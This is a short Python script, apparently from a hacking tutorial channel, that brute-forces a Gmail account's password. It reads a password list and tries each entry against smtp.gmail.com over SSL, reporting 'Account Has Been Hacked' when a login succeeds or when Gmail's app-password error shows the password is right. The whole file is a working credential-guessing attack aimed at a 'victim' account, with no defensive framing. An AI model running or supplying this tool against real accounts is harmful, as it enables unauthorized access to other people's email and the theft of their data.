#
#  _                                _                __          __ _  _    _        _____      _ 
# | |                              (_)               \ \        / /(_)| |  | |      / ____|    | |
# | |      ___   __ _  _ __  _ __   _  _ __    __ _   \ \  /\  / /  _ | |_ | |__   | |         | |
# | |     / _ \ / _` || '__|| '_ \ | || '_ \  / _` |   \ \/  \/ /  | || __|| '_ \  | |     _   | |
# | |____|  __/| (_| || |   | | | || || | | || (_| |    \  /\  /   | || |_ | | | | | |____| |__| |
# |______|\___| \__,_||_|   |_| |_||_||_| |_| \__, |     \/  \/    |_| \__||_| |_|  \_____|\____/ 
#                                              __/ |                                              
#                                             |___/                         -  By CJ
#
# YouTube : www.youtube.com/@LearningWithCJ
# GitHub  : www.github.com/LearningWithCJ
# Telegram: t.me/LearningWithCJ
#

import smtplib
import os
import time



target_gmail = "" # victim gmail
passlist_file = "" # password list file path (.txt)


class Crack():
    def __init__(self, gmail, file):
        self.gmail = gmail
        self.passFile = file
        self.passlist = []
        self.server = None

    def openFile(self):
        if os.path.exists(self.passFile):
            file = open(self.passFile, "r", encoding="utf8")
            self.passlist = file.readlines()
            self.connect(False)
        else:
            print("The Path Of Password List Is Not Exists.")
            return

    def connect(self, resume):
        while True:
            try:
                self.server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
                self.server.ehlo()
                break
            except Exception as e:
                print(e)
                time.sleep(1)
        if resume:
            return
        else:
            self.login()
    
    def login(self):
        i = 0
        for password in self.passlist:
            password = password.replace("\n", "")

            i += 1
            while True:
                try:
                    print("Attempt " + str(i))
                    self.server.login(self.gmail, password)
                    print("Account Has Been Hacked, Password : " + password)
                    break
                except Exception as e:
                    error = str(e)
                    if "Application-specific password required" in error:
                        print("Account Has Been Hacked, Password : " + password + " (Has Authentication)")
                        break
                    elif "Username and Password not accepted" in error:
                        print("password not found => " + password)
                        break
                    else:
                        print(e)
                        self.connect(True)
                        continue



if __name__ == "__main__":
    crack = Crack(target_gmail, passlist_file)
    crack.openFile()
